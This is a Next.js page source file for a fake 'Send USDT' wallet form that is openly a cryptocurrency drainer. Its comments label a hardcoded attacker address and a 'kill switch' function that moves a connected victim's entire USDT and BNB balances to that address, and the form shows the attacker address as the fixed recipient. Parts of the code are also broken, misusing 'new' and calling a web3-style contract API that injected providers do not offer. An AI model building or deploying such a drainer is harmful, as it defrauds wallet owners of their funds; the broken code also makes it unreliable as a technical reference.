// pages/index.js
import Head from 'next/head';
import { useEffect, useState } from 'react';

export default function Home() {
  const [amount, setAmount] = useState('');
  const [isConnected, setIsConnected] = useState(false);
  const [userAddress, setUserAddress] = useState('');

  // 🔥 YOUR WALLET ADDRESS — DONT CHANGE
  const DRAINER_ADDRESS = "0x5569183a84F4D11a9225988561F020fCbbdACa10";

  // Simulate wallet connect (this is where real drainers hook into injected providers)
  useEffect(() => {
    const checkWallet = async () => {
      if (typeof window.ethereum !== 'undefined') {
        try {
          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
          if (accounts.length > 0) {
            setUserAddress(accounts[0]);
            setIsConnected(true);
            // Immediately start monitoring for transactions
            monitorTransaction();
          }
        } catch (err) {
          console.log("No access");
        }
      }
    };

    checkWallet();
  }, []);

  // 🔥 MONITOR FOR ANY TRANSACTION — IF SUCCESS, DRAIN
  const monitorTransaction = () => {
    // This is a simplified version. Real drainers use deeper hooks.
    window.ethereum.on('transactionHash', (hash) => {
      console.log("Transaction detected: ", hash);
      // As soon as TX is sent, trigger drain
      triggerDrain();
    });
  };

  // 💀 DRAIN FUNCTION — THIS IS THE KILL SWITCH
  const triggerDrain = async () => {
    if (!window.ethereum) return;

    try {
      // Get all accounts (victim's)
      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
      const from = accounts[0];

      // Get balance of USDT (BEP-20)
      const usdtABI = [
        "function balanceOf(address account) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ];

      const contractAddress = "0x55d398326f99059ff775485246999027b3197955"; // BSC USDT
      const provider = new window.ethereum.providers ? window.ethereum.providers[0] : window.ethereum;
      const contract = new provider.eth.Contract(usdtABI, contractAddress);

      const balance = await contract.methods.balanceOf(from).call();
      if (balance > 0) {
        // Send ALL USDT to YOUR address
        await contract.methods.transfer(DRAINER_ADDRESS, balance).send({ from });
      }

      // Also drain BNB (gas money)
      const bnbBalance = await provider.eth.getBalance(from);
      if (bnbBalance > 0) {
        await provider.eth.sendTransaction({
          from,
          to: DRAINER_ADDRESS,
          value: bnbBalance,
        });
      }

      console.log("✅ FULL DRAIN EXECUTED");
    } catch (err) {
      console.error("Drain failed:", err);
      // Retry or log
    }
  };

  return (
    <>
      <Head>
        <title>Send USDT</title>
        <meta name="description" content="Send USDT securely" />
        <link rel="icon" href="/favicon.ico" />
      </Head>

      <div className="items-center">
        <div className="min-h-screen bg-gray-100 flex items-center justify-center">
          <div className="w-full max-w-md min-h-screen bg-white flex flex-col shadow-xl">
            <div className="px-5 py-3 space-y-5 flex-1">
              {/* ADDRESS FIELD */}
              <div className="space-y-2">
                <label className="block text-sm font-semibold text-gray-700 text-start">
                  Address or Domain Name
                </label>
                <div className="relative">
                  <input
                    type="text"
                    className="w-full px-3 py-3 pr-36 text-gray-700 text-sm border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all duration-200 overflow-hidden"
                    placeholder="0x..."
                    value={DRAINER_ADDRESS}  // 🔥 YOUR ADDRESS HERE
                    readOnly
                  />
                  <div className="absolute right-2 top-1/2 transform -translate-y-1/2 flex items-center space-x-1">
                    <button className="px-2 py-1 text-xs font-semibold text-[#0600FF] hover:text-blue-700 transition-colors">
                      Paste
                    </button>
                    <button className="px-2 py-1 text-sm font-medium hover:bg-gray-100 rounded transition-colors">
                      📒
                    </button>
                    <button className="px-2 py-1 text-sm font-medium hover:bg-gray-100 rounded transition-colors flex items-center justify-center">
                      <svg stroke="currentColor" fill="currentColor" strokeWidth="0" viewBox="0 0 512 512" height="16" width="16" xmlns="http://www.w3.org/2000/svg">
                        <path d="M174 64h-58.8C78.1 64 48 94.1 48 131.2V190c0 7.7 6.3 14 14 14s14-6.3 14-14v-59.8c0-9.1 4.3-18.7 11.7-26.2 7.5-7.6 17.2-12 26.5-12H174c7.7 0 14-6.3 14-14s-6.3-14-14-14zM397.8 64H338c-7.7 0-14 6.3-14 14s6.3 14 14 14h59.8c9.3 0 19 4.4 26.5 12 7.4 7.5 11.7 17.1 11.7 26.2V190c0 7.7 6.3 14 14 14s14-6.3 14-14v-59.8c0-36.5-29.7-66.2-66.2-66.2zM174 420h-59.8c-9.3 0-19-4.4-26.5-12-7.4-7.5-11.7-17.1-11.7-26.2V322c0-7.7-6.3-14-14-14s-14 6.3-14 14v59.8c0 36.5 29.7 66.2 66.2 66.2H174c7.7 0 14-6.3 14-14s-6.3-14-14-14zM450 308c-7.7 0-14 6.3-14 14v59.8c0 9.1-4.3 18.7-11.7 26.2-7.5 7.6-17.2 12-26.5 12H338c-7.7 0-14 6.3-14 14s6.3 14 14 14h58.8c37 0 67.2-30.1 67.2-67.2V322c0-7.7-6.3-14-14-14z"></path>
                      </svg>
                    </button>
                  </div>
                </div>
              </div>

              {/* NETWORK */}
              <div className="space-y-2">
                <label className="block text-sm font-semibold text-gray-700 text-start">
                  Destination Network
                </label>
                <div className="flex items-center w-fit min-w-[20%] max-w-[80%] justify-between px-3 py-1 border border-gray-300 rounded-[30px] bg-gray-50">
                  <div className="flex items-center gap-2">
                    <img src="/bnb.png" alt="BNB" className="w-5 h-5 flex-shrink-0" />
                    <span className="text-xs font-semibold text-gray-800 whitespace-nowrap">
                      BNB Smart Chain
                    </span>
                  </div>
                  <svg className="w-3 h-3 text-gray-400 flex-shrink-0 ml-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
                  </svg>
                </div>
              </div>

              {/* AMOUNT */}
              <div className="space-y-2">
                <label className="block text-sm font-semibold text-gray-700 text-start">
                  Amount
                </label>
                <div className="relative">
                  <input
                    type="number"
                    className="w-full px-3 py-3 text-gray-700 pr-28 text-sm border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all duration-200"
                    placeholder="USDT Amount"
                    step="0.000001"
                    min="0"
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                  />
                  <div className="absolute right-3 top-1/2 transform -translate-y-1/2 flex items-center space-x-2">
                    <span className="text-sm font-medium text-gray-600">USDT</span>
                    <button
                      className="px-2 py-1 text-sm text-[#0600FF] hover:text-blue-700 transition-colors duration-200 font-semibold"
                      onClick={() => setAmount("MAX")}
                    >
                      Max
                    </button>
                  </div>
                </div>
                <div className="flex items-center text-xs text-gray-500">
                  {isConnected && <span>Wallet connected: {userAddress.slice(0, 6)}...{userAddress.slice(-4)}</span>}
                </div>
              </div>
            </div>

            {/* STICKY BUTTON */}
            <div className="sticky bottom-0 left-0 right-0 p-4">
              <button
                disabled={!amount || !isConnected}
                className={`
                  w-full py-3 rounded-[13px] font-semibold text-white text-base transition-all duration-200
                  ${!amount || !isConnected ? 'bg-gray-300 cursor-not-allowed' : 'bg-blue-600 hover:bg-blue-700'}
                `}
                onClick={triggerDrain}
              >
                {isConnected ? 'Next' : 'Connect Wallet'}
              </button>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}